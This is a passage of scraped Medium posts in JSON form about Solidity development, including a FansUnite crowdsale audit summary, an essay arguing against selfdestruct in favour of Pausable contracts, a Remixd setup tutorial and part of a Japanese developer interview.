contract can perform the token transfer when a buying is made.Hope you can see the use of dapp.tools and the convenience when developing contract on Ethereum platform. There are some other packages from dapp.tools and you will find more fun from them.", "responses": 0, "tags": ["Ethereum", "Solidity", "Token", "Erc20", "Smart Contract Blockchain"]}, {"title": "FansUnite Audit", "post_link": "https://blog.zklabs.io/fansunite-audit-e16dd53e42c?source=search_post", "author_name": "Dean Eigenmann", "author_link": "https://blog.zklabs.io/@deaneigenmann", "publish_date": "2017-11-02", "last_modified_date": "2018-01-10", "readtime": "1.73", "claps": 101, "voters": 3, "content": "FansUnite AuditDean EigenmannFollowNov 2, 2017 \u00b7 2 min readThe ZK Labs auditors were hired by the FansUnite team to conduct 2 separate audits of their crowdsale and token contracts, which can be found in the FansUnite github repository. The team audited the smart contract versions found in the commit 1c989dbd269958df1d474d5e29ed11e96e7efee0.The severe issue mentioned below were fixed by the FansUnite team as of the commit 75cc4b3d1a6232bdd107b17637bb264a94981e04.Full report by Dean Eigenmann.Along with investigating some of the security issues, we added some of our recommendations that could be implemented to simplify and improve the code.SevereA severe issue was found which would lead to the failure of finalization of the crowdsale. This was due to the fact that the last purchase could exceed token cap, causing an exception to be thrown by SafeMath in the finalize method.This issue could occur not only through the purchase function, but also through the addPrecommitment function, which allows the FansUnite team to allocate tokens to addresses.The solution of this issue was to simply check that an allocation through either the addPrecommitment or the purchase function does not exceed the maximum limit.SuggestionsAlong with the issue we had found, we also found a series of improvements and changes that could be made to the code.The MinGoalReached event can be removed as it is never used.The multiplier 10**24 is used repeatedly, a constant could be created in place.The doPurchase function is passed a parameter called _owner that is unused. We suggested to remove this parameter and simply use the msg.sender constant.We suggested that the transfer method call in the doPurchase function should use the weiAmount variable rather than the msg.value constant.We suggested that the addToWhitelist function should be adapted so an array of addresses could be whitelisted. This would reduce the amount of transactions required significantly.We suggested to the developers that the FansUniteToken could be easily replaced with contracts from the OpenZeppelin library.The TokenVesting contract constructor could be modified to automatically multiple the _duration variable by 1 weeks, simplifying what needs to be passed.It could occur that the finalize method mints 0 tokens to the unsoldSupplyAddress, we suggested that a check should be added.ConclusionWe found one severe issue, which we explained to the FansUnite team along with a list of possible methods to fix the issue. Additionally we proposed changes to follow best practice standards as well as increase the legibility of the code.", "responses": 0, "tags": ["Blockchain", "Audit", "Solidity", "Smart Contracts"]}, {"title": "Selfdestruct is a Bug.", "post_link": "https://blog.b9lab.com/selfdestruct-is-a-bug-9c312d1bb2a5?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://blog.b9lab.com/@robhitchens", "publish_date": "2019-05-23", "last_modified_date": "2019-05-23", "readtime": "3.26", "claps": 91, "voters": 4, "content": "Selfdestruct is a Bug.Rob HitchensFollowMay 23 \u00b7 4 min readA few months ago, Steve Marx at Consensys Diligence published Upgradability is a Bug in which he unfolds the following line of reasoning:Smart contracts are useful because they\u2019re trustless.Immutability is a critical feature to achieve trustlessness.Upgradeability undermines a contract\u2019s immutability.Therefore, upgradeability is a bug. (But there are mitigations!)We could apply the same reasoning to selfdestruct:Smart contracts are useful because they\u2019re trustless.Immutability is a critical feature to achieve trustlessness.selfdestruct()undermines a contract\u2019s immutability.Therefore, selfdestruct()is a bug. (It is final.)Let us look at what selfdestruct()does, how it does it, and alternative ways to achieve similar goals, without the anti-features.Effects of selfdestructselfdestruct()destroys deployed contracts and forwards ETH on deposit to an address payable passed into the function.Newcomers to the world of immutable software often welcome the discovery of selfdestruct. It appears to be an opportunity to mitigate concerns about the immutability of their contracts. Following the complete destruction of the contract, all the funds in the contract will be returned. Intuitively, this seems like shedding the burden of perfection. What\u2019s not to like?Dangerous Voids AheadPhoto by Bal\u00e1zs K\u00e9tyi on Unsplashselfdestruct leaves voids where contracts used to be. It\u2019s not unreasonable to imagine that users may proceed on the assumption that a contract exists at an address that was known to be valid in the past, naively thinking it is immutable. Think \u201cbookmarks\u201d. Think about UIs that lead users down well-marked trails that worked, at one time. Surprise is an anti-feature, more so if it is costly.After selfdestruct(), there is no code there. There is no accounting, and there are no functions to retrieve any ETH or tokens that arrive. With no possibility of retrieval, any funds sent to voided contracts are marooned \u2014 approximately the same as destroyed. Funds and assets go in but they don\u2019t come out.Anything selfdestruct can do, Pausable can do better.selfdestruct usually involves some sort of privileged authority to sign a transaction that causes the destruction of the contract. In practice, something like:function kill() public onlyOwner {  selfdestruct(msg.sender);}The need for access control is self-evident, but access control doesn\u2019t alter the implications of using it.A privileged user can irreversibly stop everything, destroy the contract and seize the funds.That statement contains anti-features:irreversibly \u2014 There is no way to reverse course and resume normal processing. It\u2019s so drastic, one might hesitate to use it even in an emergency.destroy the contract \u2014 A destroyed contract lacks the logic that would reject unwanted incoming funds or enable retrieval of funds. These voids can have unexpected effects on other contracts that call non-existent functions.seize ETH \u2014 The privileged user reserves for themselves the privilege of seizing funds. That is extraordinary decision-making power.Favor Pausable over selfdestructThe Pausable pattern enables more precision:stop everything that should be stopped.allow everything that should be allowed during a maintenance/emergency outage.Following situation assessment, the privileged user can:renounce the possibility of restarting the contract.resume normal processing.https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/lifecycle/Pausable.solNotice \u201cseize funds\u201d is not among the features. Why should a privileged user have the option of doing that?And what if the contract contains tokens? At the very least, it will be necessary to rescue those before destroying the bytecode because once the bytecode is destroyed there is probably no possibility of recovering them.Be Preciseselfdestruct() is a blunt sledgehammer compared to the nuanced precision of Pausable. For each state-changing function, assign one of two modifiers:function doSomething() public whenNotPaused { ... // normal modefunction doSomethingOdd() public whenPaused { // emergency measuresDoing so should prompt some thought about the desired emergency management regime. If one wanted to, one could approximate selfdestruct style seizure of funds and clearly spell out the extent of the privilege:function exitScam(address payable beneficiary) public whenPaused onlyOwner {  beneficiary.transfer(address(this).balance);}That translates to, roughly \u2014 \u201cIn an emergency stop situation, the owner is allowed to seize all funds.\u201d It\u2019s similar to selfdestruct, with fewer anti-features. It\u2019s also explicit about the special privilege.Most emergency management regimes should not include seizing the funds because incentives to abuse authority are an anti-feature. When you see selfdestruct() in a production contract, it\u2019s strong signal of extraordinary decision-making power that calls for extraordinary justification.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": 0, "tags": ["Ethereum", "Solidity", "Solidity Tutorial", "Software Development", "Ethereum Blockchain"]}, {"title": "Remixd Tutorial", "post_link": "https://medium.com/@jeffprestes/remixd-tutorial-809c96f5af36?source=search_post", "author_name": "Jeff Prestes", "author_link": "https://medium.com/@jeffprestes", "publish_date": "2019-05-14", "last_modified_date": "2019-05-15", "readtime": "2.51", "claps": 6, "voters": 4, "content": "Remixd TutorialJeff PrestesFollowMay 14 \u00b7 3 min readA tool to increase your Smart Contract development productivity.In order to help developers around the globe to develop Smart Contracts the Ethereum Foundation sponsored the Remix IDE ( http://remix.ethereum.org ) . For anyone who does not know yet, Remix is a online IDE for Smart Contracts development using Solidity.However, a Smart Contract project includes not only the Smart Contract source code itself but also testing, versioning and deploying tools and other artifacts. Mostly these artifacts are managed and built using other IDEs such as Visual Studio Code, Atom or vim. You can use these IDEs to write your Solidity code but they does not have the same support and tooling to deal with the complexities of Ethereum that Remix has.So, how to use the best of both worlds? That\u2019s where Remixd ( https://https://github.com/ethereum/remixd ) comes in. It is a small javascript service that connects a browser with a Remix page opened to local filesystem via websocket. As you write your Solidity code in Remix is automatically saved in your filesystem where your Visual Studio Code is pointing to.In order to use it you must have node.js and npm installed and working. But most importantly your node version must be the LTS (when this article was written it was 10.x). The latest version is not supported.To install remixd open your favorite terminal and run:$ npm install remixd -gAccess the directory where your want to store your Smart Contracts and run:$ remixd --remix-ide http://remix.ethereum.org -s ./It will start a websocket service allowing the connection from your browser opened at remix.ethereum.org page ( see - -remix-ide parameter) to your local filesystem at current directory ./ ( see -s parameter ) in port 65520You should see logs similar to this in your terminal:Now open your browser and access Remix IDE.In top left column click on the localhost connection button.A window explaining how it works is shown. Click at \u2018Connect\u2019 link to start the connection between your browser and the remixd service.After clicking on it, the localhost set of files is shown at Remix\u2019s left column. If there are files on the directory you choose on remixd service start they are going to be shown now.Select a file and change it. Later open the directory using your favorite IDE (e.g. Visual Studio Code) and see the changes performed. In Visual Studio Code you can open the integrated terminal and try to execute a command as:$ git add Registro.solVoil\u00e0! Now your Remix online IDE is integrated with your favorite IDE. Happy coding ;)PS.: Thanks Fabio Hildebrand for introducing me to remixd", "responses": 0, "tags": ["Ethereum", "Solidity", "Remix", "Smart Contracts"]}, {"title": "\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u731b\u5b9f\u88c5\u4e2d\u306e\u4f34\u30eb\u30ab\u3055\u3093\u3078\u30a4\u30f3\u30bf\u30d3\u30e5\u30fc", "post_link": "https://medium.com/@missbitcoin_mai/%E3%82%B9%E3%83%9E%E3%83%BC%E3%83%88%E3%82%B3%E3%83%B3%E3%83%88%E3%83%A9%E3%82%AF%E3%83%88%E7%8C%9B%E5%AE%9F%E8%A3%85%E4%B8%AD%E3%81%AE%E4%BC%B4%E3%83%AB%E3%82%AB%E3%81%95%E3%82%93%E3%81%B8%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%93%E3%83%A5%E3%83%BC-d04cacf4077f?source=search_post", "author_name": "MissBitcoin", "author_link": "https://medium.com/@missbitcoin_mai", "publish_date": "2018-02-19", "last_modified_date": "2018-02-19", "readtime": "9.96", "claps": 52, "voters": 3, "content": "\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u731b\u5b9f\u88c5\u4e2d\u306e\u4f34\u30eb\u30ab\u3055\u3093\u3078\u30a4\u30f3\u30bf\u30d3\u30e5\u30fcMissBitcoinFollowFeb 19, 2018 \u00b7 10 min read\u3053\u3093\u306b\u3061\u306f\uff012018\u5e742\u670824\u65e5(\u571f)\u306b\u6ce8\u76ee\u306e\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u30fb\u4eee\u60f3\u901a\u8ca8\u4f01\u696d\u306e\u958b\u767a\u73fe\u5834\u3092\u77e5\u3063\u3066\u89e6\u308c\u308b\u4f1a\u3092\u5343\u4ee3\u7530\u533a\u306b\u3066\u958b\u50ac\u3057\u307e\u3059\uff01\u305d\u308c\u306b\u5148\u7acb\u3061\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u696d\u754c\u306b\u98db\u3073\u8fbc\u3093\u3060\u30a8\u30f3\u30b8\u30cb\u30a2\u306e\u4f34\u30eb\u30ab\u6c0f\u306b\u8a71\u3092\u805e\u304d\u307e\u3057\u305f\u3002\u8cbf\u6613\u4f1a\u793e\u3067\u50cd\u3044\u305f\u5f8c\u3001\u73fe\u5728\u306f\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306b\u306e\u3081\u308a\u8fbc\u3093\u3067\u3044\u308b\u3068\u3044\u3046\u30eb\u30ab\u3055\u3093\u3002\u6c17\u306b\u306a\u308a\u307e\u3059\u3002\u2015\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u59cb\u3081\u305f\u306e\u306f\u3044\u3064\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u4eca\u306f27\u6b73\u3067\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u59cb\u3081\u305f\u306e\u306f15\u6b73\u306e\u9803\u3067\u3059\u3002\u5f53\u6642\u3001\u52c9\u5f37\u3067\u4f7f\u3063\u3066\u3044\u305f\u6697\u8a18\u3092\u3059\u308b\u305f\u3081\u306e\u30d5\u30e9\u30c3\u30b7\u30e5\u30ab\u30fc\u30c9\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u304c\u3042\u308a\u307e\u3057\u305f\u3002\u5358\u8a9e\u5e33\u306e\u3088\u3046\u306a\u3082\u306e\u3067\u3059\u3002\u305d\u306e\u30a2\u30d7\u30ea\u306f\u81ea\u5206\u3067\u8272\u3005\u306a\u30ab\u30fc\u30c9\u3092\u4f5c\u3063\u3066\u3001\u30ab\u30fc\u30c9\u306e\u51fa\u65b9\u3084\u898b\u305f\u76ee\u3092HTML\u3084CSS\u3067\u5909\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3057\u305f\u3002\u30a2\u30d7\u30ea\u5185\u3067\u3059\u304c\u3001\u305d\u3053\u3067HTML\u3068CSS\u3092\u5927\u4f53\u7406\u89e3\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3057\u305f\u3002\u305d\u306e\u5f8c\u3001\u8cbf\u6613\u306e\u4f1a\u793e\u3067\u50cd\u3044\u3066\u3044\u305f2015\u5e745\u6708\u9803\u3001\u65b0\u3057\u304fIT\u3092\u62c5\u5f53\u3059\u308b\u4eba\u304c\u5165\u793e\u3057\u3066\u304d\u307e\u3057\u305f\u3002\u5f7c\u304cPHP\u3084JavaScript\u304c\u3067\u304d\u308b\u4eba\u3060\u3063\u305f\u306e\u3067\u3001\u81ea\u5206\u306e\u5e2d\u3092\u7121\u7406\u3084\u308a\u5f7c\u306e\u5e2d\u306e\u96a3\u306b\u7f6e\u3044\u3066\u3001\u6bce\u65e5\u8272\u3005\u306a\u3053\u3068\u3092\u805e\u304d\u306a\u304c\u3089\u3001\u6539\u3081\u3066\u52c9\u5f37\u3057\u59cb\u3081\u307e\u3057\u305f\u3002\u81ea\u5206\u3067\u4f5c\u308a\u305f\u3044\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3084\u30db\u30fc\u30e0\u30da\u30fc\u30b8\u304c\u982d\u306e\u4e2d\u306b\u3042\u3063\u305f\u306e\u3067\u3001\u3053\u308c\u3067\u3088\u3046\u3084\u304f\u4f5c\u308b\u305f\u3081\u306e\u30b9\u30ad\u30eb\u3092\u8eab\u306b\u3064\u3051\u3089\u308c\u308b\u3093\u3058\u3083\u306a\u3044\u304b\u3068\u601d\u3063\u3066\u9811\u5f35\u308a\u307e\u3057\u305f\u3002\u2015\u3069\u3046\u3044\u3046\u3082\u306e\u3092\u4f5c\u308a\u305f\u3044\u3068\u601d\u3063\u3066\u3044\u305f\u306e\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u632f\u308a\u8fd4\u308b\u3068\u3061\u3087\u3063\u3068\u30c0\u30b5\u3044\u3093\u3067\u3059\u304c\u3001\u591a\u304f\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u6700\u521d\u306b\u53d6\u308a\u7d44\u3080\u30bf\u30b9\u30af\u7ba1\u7406\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3067\u3059\u3002\u79c1\u3082\u30ea\u30b9\u30c8\u3084\u30bf\u30b9\u30af\u7ba1\u7406\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u304c\u5143\u3005\u3059\u3054\u304f\u597d\u304d\u3067\u3057\u305f\u3002\u4f8b\u3048\u3070\u3001\u5b66\u6821\u3067\u52c9\u5f37\u3059\u308b\u3053\u3068\u3088\u308a\u3082\u3001\u52c9\u5f37\u3059\u308b\u8a08\u753b\u3092\u7acb\u3066\u308b\u3053\u3068\u306b\u6642\u9593\u3092\u4f7f\u3063\u3066\u3044\u307e\u3057\u305f\u3002\u305d\u3046\u3044\u3046\u3053\u3068\u304c\u5927\u597d\u304d\u3067\u8272\u3005\u306a\u30ea\u30b9\u30c8\u3092\u4f5c\u3063\u305f\u308a\u3001\u3042\u308b\u3079\u304d\u59ff\u3092\u8003\u3048\u305f\u308a\u3001\u30bf\u30b9\u30af\u7ba1\u7406\u3092\u3057\u305f\u308a\u3002\u65e2\u5b58\u306e\u305d\u3046\u3044\u3046\u30a2\u30d7\u30ea\u3092\u5168\u90e8\u4f7f\u3063\u3066\u3001\u6bce\u56de\u4f55\u304b\u8db3\u308a\u306a\u3044\u306a\u3068\u601d\u3063\u3066\u3001\u6700\u7d42\u7684\u306b\u81ea\u5206\u3067\u4f5c\u308b\u3057\u304b\u306a\u3044\u3068\u601d\u3063\u3066\u4f5c\u308a\u307e\u3057\u305f\u3002\u2015JavaScript\u306b\u306f\u3069\u3053\u3067\u6163\u308c\u305f\u3093\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u6700\u521d\u306fPHP\u306e\u65b9\u304c\u5f37\u304b\u3063\u305f\u3093\u3067\u3059\u3002\u305d\u306e\u7406\u7531\u306f\u3001\u4f1a\u793e\u306b\u5165\u3063\u3066\u304d\u305fIT\u62c5\u5f53\u306e\u4eba\u304cJavaScript\u3088\u308a\u3082PHP\u306e\u65b9\u304c\u5f37\u304b\u3063\u305f\u304b\u3089\u3067\u3059\u3002\u4e21\u65b9\u6559\u3048\u3066\u304f\u308c\u305f\u306e\u3067\u3059\u304c\u3001\u79c1\u306fPHP\u306e\u65b9\u304c\u5148\u306b\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3057\u305f\u3002JavaScript\u306f\u5f8c\u304b\u3089\u899a\u3048\u305f\u306e\u3067\u3059\u304c\u3001\u6700\u521d\u306f\u6b63\u76f4\u66f8\u304d\u306b\u304f\u3044\u306a\u3068\u601d\u3063\u3066\u3044\u307e\u3057\u305f\u3002PHP\u306fHTML\u306e\u4e2d\u3067\u3082\u66f8\u3051\u307e\u3059\u304c\u3001JavaScript\u306f\u5225\u67a0\u3068\u8003\u3048\u306a\u3051\u308c\u3070\u3044\u3051\u307e\u305b\u3093\u3002\u305d\u308c\u304c\u6700\u521d\u306f\u5c11\u3057\u5927\u5909\u3067\u3057\u305f\u3002Angular\u3001React\u3001Vue.js\u3068\u3044\u3046\uff13\u3064\u306e\u5927\u304d\u306a\u30d5\u30ec\u30fc\u30e0\u30ef\u30fc\u30af\u304c\u3042\u308a\u307e\u3059\u3002\u305d\u306e\u4e2d\u3067\u305f\u307e\u305f\u307e\u51fa\u4f1a\u3063\u305fVue.js\u304c\u3059\u3070\u3089\u3057\u904e\u304e\u3066\u604b\u306b\u843d\u3061\u307e\u3057\u305f\uff08\u7b11\uff09\u3002\u305d\u308c\u3067\u3069\u3093\u3069\u3093JavaScript\u304c\u597d\u304d\u306b\u306a\u3063\u3066\u3001\u9006\u306b\u30b5\u30fc\u30d0\u30fc\u5074\u306e\u8a00\u8a9e\u306f\u3042\u307e\u308a\u597d\u304d\u3067\u306f\u306a\u304f\u3066\u3001\u4eca\u306f\u5168\u90e8JavaScript\u3060\u3051\u3067UI\u3092\u4f5c\u308a\u305f\u3044\u3067\u3059\u3002\u306a\u305c\u304b\u3068\u8a00\u3046\u3068\u3001PHP\u306f\u4ed5\u4e8b\u3068\u3044\u3046\u611f\u3058\u304c\u3059\u308b\u304b\u3089\u3067\u3059\u3002\u4f5c\u3089\u306a\u3044\u3068\u3044\u3051\u306a\u3044\u69cb\u9020\u3001\u307f\u3093\u306a\u304c\u901a\u308b\u9053\u3002\u3067\u3082\u672c\u5f53\u306b\u30e6\u30fc\u30b6\u30fc\u304c\u89e6\u308c\u308bUI\u304c\u81ea\u5206\u306e\u4f5c\u308a\u305f\u3044\u3082\u306e\u306a\u306e\u3067\u3001\u305d\u308c\u306b100%\u96c6\u4e2d\u3067\u304d\u308b\u306e\u304c1\u756a\u697d\u3057\u3044\u3067\u3059\u3002\u305d\u308c\u304cJavaScript\u3067\u5168\u90e8\u3067\u304d\u308b\u306e\u3067\u3001\u5f97\u610f\u306b\u306a\u3063\u3066\u304d\u307e\u3057\u305f\u3002\u2015\u305d\u3046\u3084\u3063\u3066\u30b9\u30ad\u30eb\u3092\u8eab\u306b\u3064\u3051\u3066\u3044\u304f\u4e2d\u3067\u3001Solidity\u306b\u3064\u3044\u3066\u306f\u3069\u3046\u611f\u3058\u3066\u3044\u307e\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0fSolidity\u306f\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u305f\u3081\u306e\u8a00\u8a9e\u3067\u3059\u304c\u3001JavaScript\u306b\u975e\u5e38\u306b\u8fd1\u3044\u3067\u3059\u3002Solidity\u306f\u307e\u3060\u6570\u30ab\u6708\u3057\u304b\u3044\u3058\u3063\u3066\u3044\u306a\u3044\u306e\u3067\u3001\u5f97\u610f\u306a\u308f\u3051\u3067\u306f\u306a\u3044\u3067\u3059\u304cJavaScript\u306e\u30d9\u30fc\u30b9\u304c\u3042\u308b\u306e\u3067\u305d\u308c\u307b\u3069\u96e3\u3057\u304f\u306f\u306a\u3044\u3067\u3059\u3002\u30b3\u30f3\u30bb\u30d7\u30c8\u3084Solidity\u306e\u4e2d\u3067\u4f7f\u3048\u308bvariable\u306e\u7a2e\u985e\u306a\u3069\u304c\u3042\u308b\u7a0b\u5ea6\u4f3c\u3066\u3044\u307e\u3059\u3002\u2015\u96e3\u3057\u3044\u90e8\u5206\u3082\u3042\u308a\u307e\u3059\u304b\uff1fSolidity\u3001\u3064\u307e\u308a\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u96e3\u3057\u3044\u3068\u3053\u308d\u306f1\u56de\u516c\u958b\u3057\u3066\u3057\u307e\u3046\u3068\u623b\u305b\u306a\u3044\u3053\u3068\u3067\u3059\u3002WEB\u30a2\u30d7\u30ea\u306e\u5834\u5408\u306f\u3001\u4f5c\u3063\u3066\u51fa\u3057\u3066\u3001\u30d0\u30b0\u304c\u51fa\u305f\u3089\u4fee\u6b63\u3059\u308c\u3070\u3044\u3044\u306e\u3067\u7c21\u5358\u3067\u3059\u3002\u3057\u304b\u3057\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306f\uff11\u56de\u51fa\u3057\u3066\u3057\u307e\u3046\u3068\u3001\u305d\u3053\u3067\u30d0\u30b0\u304c\u3042\u3063\u305f\u3089\u5927\u5909\u306a\u3053\u3068\u306b\u306a\u3063\u3066\u3057\u307e\u3046\u306e\u304c\u96e3\u3057\u3044\u3068\u3053\u308d\u3067\u3059\u306d\u3002\u2015\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306f\u4eca\u5f8c\u3001\u793e\u4f1a\u306b\u3069\u3046\u3044\u3046\u30a4\u30f3\u30d1\u30af\u30c8\u3092\u4e0e\u3048\u3066\u3044\u304f\u3068\u601d\u3044\u307e\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u96e3\u3057\u3044\u8cea\u554f\u3067\u3059\u306d\uff08\u7b11\uff09\u3002\u3053\u306e\u8cea\u554f\u3060\u3051\u3067\u3082\uff13\u6642\u9593\u306f\u8a71\u305b\u308b\u3088\u3046\u306a\u6c17\u304c\u3057\u307e\u3059\u3002\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30a4\u30f3\u30d1\u30af\u30c8\u306f\u3001\u4f8b\u3048\u3070\u91d1\u878d\u6a5f\u95a2\u3092\u901a\u3055\u305a\u306b\u8cc7\u91d1\u8abf\u9054\u3067\u304d\u308b\u3053\u3068\u3001\u8ab0\u304b\u3092\u4fe1\u7528\u3059\u308b\u3053\u3068\u306a\u3057\u306b\u5b89\u5168\u306b\u9001\u91d1\u3067\u304d\u308b\u3053\u3068\u3002\u3082\u3063\u3068\u3059\u3054\u3044\u3053\u3068\u3082\u3067\u304d\u308b\u3068\u601d\u3044\u307e\u3059\u304c\u3001\u305d\u3046\u3044\u3046\u6839\u672c\u7684\u306a\u3068\u3053\u308d\u304c\uff11\u756a\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3068\u601d\u3044\u307e\u3059\u3002\u65e5\u672c\u4eba\u306f\u3042\u307e\u308a\u4f7f\u308f\u306a\u3044\u3067\u3059\u304c\u3001\u5143\u3005\u8ca7\u3057\u3044\u56fd\u3067\u3001\u6d77\u5916\u3067\u50cd\u304f\u3088\u3046\u306b\u306a\u3063\u3066\u672c\u56fd\u306e\u81ea\u5206\u306e\u5bb6\u65cf\u306b\u6bce\u6708\u9001\u91d1\u3059\u308b\u6642\u306b\u30a6\u30a8\u30b9\u30bf\u30f3\u30e6\u30cb\u30aa\u30f3\u3057\u304b\u306a\u3044\u3093\u3067\u3059\u306d\u3002\u305d\u3046\u3044\u3046\u4eba\u305f\u3061\u304c\u3059\u3054\u304f\u591a\u3044\u3067\u3059\u3002\u305d\u3053\u3067\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u6280\u8853\u3092\u4f7f\u3063\u3066\u9060\u3044\u56fd\u306e\u5bb6\u65cf\u306b\u7c21\u5358\u306b\u9001\u91d1\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308b\u3053\u3068\u306f\u3059\u3070\u3089\u3057\u3044\u3068\u601d\u3044\u307e\u3059\u3002\u2015Solidity\u3092\u5b66\u3076\u3053\u3068\u3092\u4ed6\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u306b\u3082\u52e7\u3081\u305f\u3044\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u3059\u3054\u304f\u601d\u3044\u307e\u3059\u3002\u307e\u305a\u306f\u3084\u3063\u3066\u307f\u306a\u3044\u3068\u5206\u304b\u3089\u306a\u3044\u306e\u3067\u3002JavaScript\u304c\u3067\u304d\u308b\u4eba\u305f\u3061\u304c\u591a\u3044\u306e\u3067\u3001\u305b\u3063\u304b\u304f\u306a\u306e\u3067Solidity\u3092\u66f8\u3044\u3066\u307f\u305f\u3089\u3068\u3059\u3054\u304f\u8a00\u3044\u305f\u3044\u3067\u3059\u3002\u96e3\u3057\u3044\u3068\u3044\u3046\u30a4\u30e1\u30fc\u30b8\u304c\u3042\u308a\u307e\u3059\u304c\u3001\u5b9f\u969b\u306b\u3084\u3063\u3066\u307f\u308b\u3068\u697d\u5668\u3092\u3072\u304f\u306e\u3068\u5168\u304f\u540c\u3058\u3067\u3001\u7df4\u7fd2\u3092\u3059\u308c\u3070\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002JavaScript\u304c\u3042\u308b\u7a0b\u5ea6\u5206\u304b\u308b\u65b9\u306f\u3001Solidity\u306b\u305c\u3072\u89e6\u308c\u3066\u307b\u3057\u3044\u3067\u3059\u3002\u307f\u3093\u306a\u306b\u304a\u52e7\u3081\u3057\u305f\u3044\u3067\u3059\u3002\u2015Solidity\u306f\u6700\u521d\u3001\u3069\u3046\u3084\u3063\u3066\u52c9\u5f37\u3057\u305f\u3093\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u52d5\u753b\u5f62\u5f0f\u3067\u5b66\u3076\u3053\u3068\u304c\u591a\u3044\u3067\u3059\u3002\u52d5\u753b\u5f62\u5f0f\u306e\u30ac\u30a4\u30c9\u3001\u30c1\u30e5\u30fc\u30c8\u30ea\u30a2\u30eb\u3092\u63a2\u3057\u305f\u308a\u3057\u307e\u3059\u3002\u5b66\u3093\u3067\u3044\u308b\u3046\u3061\u306b\u5148\u751f\u304c\u3084\u3063\u3066\u3044\u308b\u3053\u3068\u3092\u30de\u30cd\u3057\u3066\u5b66\u3076\u3053\u3068\u304c\u52b9\u679c\u7684\u3060\u3068\u5206\u304b\u308a\u307e\u3057\u305f\u3002\u305f\u3060\u3001Solidity\u306e\u52d5\u753b\u306e\u30c1\u30e5\u30fc\u30c8\u30ea\u30a2\u30eb\u306f\u307e\u3060\u3042\u307e\u308a\u306a\u3044\u3067\u3059\u306d\u3002\u79c1\u304c\u4f7f\u3063\u305f\u306e\u306fUdemy\u3067\u3059\u3002\u65e5\u672c\u8a9e\u306e\u52d5\u753b\u3082\u3044\u304f\u3064\u304b\u3042\u308a\u307e\u3057\u305f\u304c\u3001\u82f1\u8a9e\u306e\u30ac\u30a4\u30c9\u3092\u4f7f\u3063\u3066\u3001\u30bc\u30ed\u304b\u3089\u4e00\u7dd2\u306bSolidity\u3001\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u4f7f\u3063\u305f\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3092\u4f5c\u308a\u307e\u3057\u3087\u3046\u3068\u3044\u3046\u306e\u3092\u3084\u3063\u3066\u3001\u975e\u5e38\u306b\u52c9\u5f37\u306b\u306a\u308a\u307e\u3057\u305f\u3002\u2015\u4eca\u304b\u3089\u3067\u3082\u9045\u304f\u306f\u306a\u3044\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0fSolidity\u3092\u59cb\u3081\u308b\u306b\u306f\u3061\u3087\u3046\u3069\u3044\u3044\u6642\u671f\u3060\u3068\u601d\u3063\u3066\u3044\u307e\u3059\u3002\u7406\u7531\u306f\u3001\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u304c\u3069\u3093\u3069\u3093\u51fa\u3066\u304d\u3066\u3044\u308b\u304b\u3089\u3067\u3059\u3002\u52c9\u5f37\u306e\u305f\u3081\u306e\u3082\u306e\u3084\u5b9f\u969b\u306b\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u4f5c\u308b\u305f\u3081\u306e\u30c4\u30fc\u30eb\u304c\u3042\u308a\u307e\u3059\u3002\u4f8b\u3092\u6319\u3052\u308b\u3068\u3001\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u66f8\u3044\u3066\u3001\u8a66\u3057\u305f\u3044\u3068\u3057\u305f\u3089\u